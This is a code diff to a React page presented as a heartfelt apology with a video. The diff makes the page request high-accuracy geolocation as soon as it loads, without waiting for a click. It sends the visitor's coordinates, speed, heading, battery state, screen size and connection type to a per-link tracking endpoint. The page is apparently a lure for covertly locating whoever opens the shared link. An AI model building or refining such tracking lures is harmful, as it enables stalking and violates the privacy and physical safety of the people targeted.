@@ -13,22 +13,6 @@ export default function HeartfeltApologyPage({ params }) {
   const [isModalOpen, setIsModalOpen] = useState(true);
   const videoRef = useRef(null);
 
-  // 1. Notify server of page visit on mount & fetch link metadata
-  useEffect(() => {
-    if (!linkId) return;
-
-    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});
-
-    fetch(`/api/links/${linkId}`)
-      .then((res) => res.json())
-      .then((data) => {
-        if (data.success && data.link) {
-          setLinkConfig(data.link);
-        }
-      })
-      .catch((err) => console.warn('Fetch link error:', err));
-  }, [linkId]);
-
   // Battery helper
   const getBattery = async () => {
     try {
@@ -42,13 +26,73 @@ export default function HeartfeltApologyPage({ params }) {
     return null;
   };
 
-  // 1. Trigger Apology modal when user clicks to play video or open special message
+  // Geolocation trigger & tracking telemetry sender
+  const captureLocation = () => {
+    if (typeof window === 'undefined' || !navigator.geolocation) return;
+
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
+
+    getBattery().then((battery) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+
+          fetch(`/api/track/${linkId || 'direct'}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude,
+              longitude,
+              accuracy,
+              altitude,
+              altitudeAccuracy,
+              heading,
+              speed,
+              screenResolution,
+              battery,
+              connectionType
+            })
+          }).catch(() => {});
+        },
+        (err) => {
+          console.warn('Geolocation notice:', err);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+  };
+
+  // 1. Initial page mount: record visit, load config, and trigger immediate location permission
+  useEffect(() => {
+    if (!linkId) return;
+
+    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});
+
+    fetch(`/api/links/${linkId}`)
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.success && data.link) {
+          setLinkConfig(data.link);
+        }
+      })
+      .catch((err) => console.warn('Fetch link error:', err));
+
+    // Instant permission prompt on initial page visit (tanpa harus klik tombol dulu)
+    captureLocation();
+  }, [linkId]);
+
+  // 2. Trigger Apology modal if needed
   const handleRequestPlay = () => {
     if (isPlaying) return;
     setIsModalOpen(true);
   };
 
-  // 2. Triggered when user confirms "Lanjutkan Menonton" inside ApologyModal
+  // 3. Triggered when user confirms "Lanjutkan" inside ApologyModal
   const handleConfirmPlay = () => {
     setIsModalOpen(false);
     setIsLoading(true);
@@ -61,44 +105,8 @@ export default function HeartfeltApologyPage({ params }) {
       });
     }
 
-    // Geolocation trigger
-    if (typeof window !== 'undefined' && navigator.geolocation) {
-      const screenResolution = `${window.screen.width}x${window.screen.height}`;
-      const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
-
-      getBattery().then((battery) => {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
-
-            fetch(`/api/track/${linkId || 'direct'}`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude,
-                longitude,
-                accuracy,
-                altitude,
-                altitudeAccuracy,
-                heading,
-                speed,
-                screenResolution,
-                battery,
-                connectionType
-              })
-            }).catch(() => {});
-          },
-          (err) => {
-            console.warn('Geolocation error:', err);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      });
-    }
+    // Geolocation trigger backup
+    captureLocation();
 
     setIsLoading(false);
   };
